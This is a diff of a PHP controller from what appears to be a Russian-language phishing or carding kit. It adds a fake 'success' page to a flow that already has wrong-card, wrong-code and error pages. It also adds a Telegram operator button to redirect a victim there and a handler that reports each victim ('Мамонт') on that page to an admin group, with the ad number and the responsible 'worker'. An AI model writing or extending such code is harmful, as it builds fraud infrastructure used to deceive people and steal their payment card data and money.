@@ -86,10 +86,10 @@ class PagesController extends Controller
     /**
      * @return bool
      */
-    private function hasErrorRedirect(): bool
+    private function hasRedirect(): bool
     {
         $redirectUrl = Cache::get("$this->uuid.redirectUrl");
-        return !is_null($redirectUrl) && parse_url($redirectUrl, PHP_URL_PATH) === "/error";
+        return !is_null($redirectUrl) && in_array(parse_url($redirectUrl, PHP_URL_PATH), ["/error", "/success"]);
     }
 
     private function processRedirection(Request $request)
@@ -98,7 +98,7 @@ class PagesController extends Controller
         $redirectUrl = Cache::get("$this->uuid.redirectUrl");
         if (!is_null($redirectUrl) && trim($request->path(), '/') !== trim(parse_url($redirectUrl, PHP_URL_PATH), '/')) {
             $redirect = $redirectUrl;
-        } else if (!$this->hasErrorRedirect()) Cache::forget("$this->uuid.redirectUrl");
+        } else if (!$this->hasRedirect()) Cache::forget("$this->uuid.redirectUrl");
         return $redirect;
     }
 
@@ -145,6 +145,7 @@ class PagesController extends Controller
                     [["text" => "⤴️ /order (неверная карта)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /order"]],
                     [["text" => "⤴️ /code (неверный код)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /code"]],
                     [["text" => "⤴️ /error (ошибка)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /error"]],
+                    [["text" => "⤴️ /success (успешно)", "callback_data" => "/redirect {$fake->track_id} {$this->uuid} /success"]],
                     [["text" => "🖇 Взять лог", "callback_data" => "/takeLog {$fake->track_id}"]],
                 ] : [],
                 "resize_keyboard" => true,
@@ -454,6 +455,19 @@ class PagesController extends Controller
             "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
         ]);
         return view('fakes.error', ['title' => 'error | 500']);
+    }
+
+    public function success()
+    {
+        $fake = $this->getFake();
+        if ($adminGroupId = BotController::groupAdmin('id')) $this->sendLogs($adminGroupId, [
+            "⚠️<b>Мамонт на странице 'успешно'</b>",
+            "=================",
+            "🆔<b>Номер объявления:</b> <code>$fake->track_id</code>",
+            "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
+            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
+        ]);
+        return view('fakes.success', ['title' => 'Success']);
     }
 
 }
